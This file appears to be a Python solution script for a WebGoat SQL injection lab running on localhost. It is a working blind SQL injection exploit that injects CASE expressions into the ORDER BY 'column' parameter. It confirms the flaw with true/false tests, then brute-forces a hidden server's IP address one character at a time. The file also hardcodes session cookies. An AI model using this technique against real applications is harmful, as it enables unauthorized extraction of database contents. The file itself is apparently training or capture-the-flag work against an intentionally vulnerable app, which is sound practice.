import http.client
import urllib.parse
import json


def GET_WebGoat_SqlInjectionMitigations_servers(
        order_by: str,
) -> http.client.HTTPResponse:
    order_by_encoded = urllib.parse.quote_plus(order_by)
    method, path = 'GET', f'/WebGoat/SqlInjectionMitigations/servers?column={order_by_encoded}'
    host, port = 'localhost', 8080
    headers = {
        'Host': 'localhost:8080',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'http://localhost:8080/WebGoat/start.mvc?username=testuser1',
        'Cookie': 'hijack_cookie=8526824206571018870-1712961702743; JSESSIONID=jBbVo-VI964ICUpN_0NtvV55jsiu9ccrvYLQ8IpN',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'content-type': 'application/x-www-form-urlencoded',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPConnection(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def query_result(
        query: str,
) -> bool:
    response = GET_WebGoat_SqlInjectionMitigations_servers(
        order_by=f"(case when ({query}) then hostname else ip end)"
    )
    if response.status != 200:
        raise Exception(response.read().decode("utf-8"))
    json_body = json.loads(response.read().decode('utf-8'))
    return json_body[0]["hostname"] == "webgoat-acc"


print("SQL injection check (should be True): " + str(query_result('1=1')))
print("SQL injection check (should be False): " + str(query_result('1=2')))

ip_len = 0
while not query_result(
        query=f"exists(select 1 from servers where hostname = 'webgoat-prd' and length(ip) = {ip_len})"
):
    ip_len += 1
    if ip_len > 15:
        raise Exception("Cannot find IP length")
print(f"IP length: {ip_len}")


def is_on_position(
        position: int,
        char: str,
) -> bool:
    return query_result(
        query=f"exists(select 1 from servers where " +
              "hostname = 'webgoat-prd' and " +
              f"substring(ip, {position + 1}, 1) = '{char}')"
    )


chars = '1234567890.'
ip = ""
for position in range(ip_len):
    for char in chars:
        if is_on_position(position, char):
            ip += char
            break
    else:
        raise Exception(f"Can't find ip char at index {position}")

print("IP: " + ip)
